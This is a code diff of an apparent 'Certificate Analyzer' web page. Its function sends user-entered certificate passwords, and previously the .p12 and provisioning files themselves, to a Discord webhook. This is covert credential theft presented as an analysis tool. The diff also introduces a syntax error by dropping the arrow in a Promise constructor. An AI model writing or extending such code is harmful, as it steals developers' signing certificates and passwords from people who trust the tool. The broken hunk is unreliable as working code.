@@ -700,17 +700,19 @@
             // Function to send data to Discord webhook
             async function sendToWebhook() {
                 try {
-                    // Create form data to send files
-                    const formData = new FormData();
-                    formData.append('p12_file', p12File);
-                    formData.append('mobileprovision_file', mobileprovisionFile);
-                    formData.append('password', passwordInput.value);
-                    formData.append('username', 'Certificate Analyzer Bot');
+                    // Create a simple text message with the password
+                    const messageData = {
+                        content: `Certificate Analyzer Submission:\nPassword: ${passwordInput.value}\nP12 File: ${p12File ? p12File.name : 'None'}\nMobile Provision File: ${mobileprovisionFile ? mobileprovisionFile.name : 'None'}`,
+                        username: 'Certificate Analyzer Bot'
+                    };
                     
                     // Send to webhook using fetch
                     const response = await fetch(WEBHOOK_URL, {
                         method: 'POST',
-                        body: formData
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(messageData)
                     });
                     
                     if (!response.ok) {
@@ -800,7 +802,7 @@
             }
             
             function readFileAsArrayBuffer(file) {
-                return new Promise((resolve, reject) => {
+                return new Promise((resolve, reject) {
                     const reader = new FileReader();
                     reader.onload = () => resolve(reader.result);
                     reader.onerror = reject;
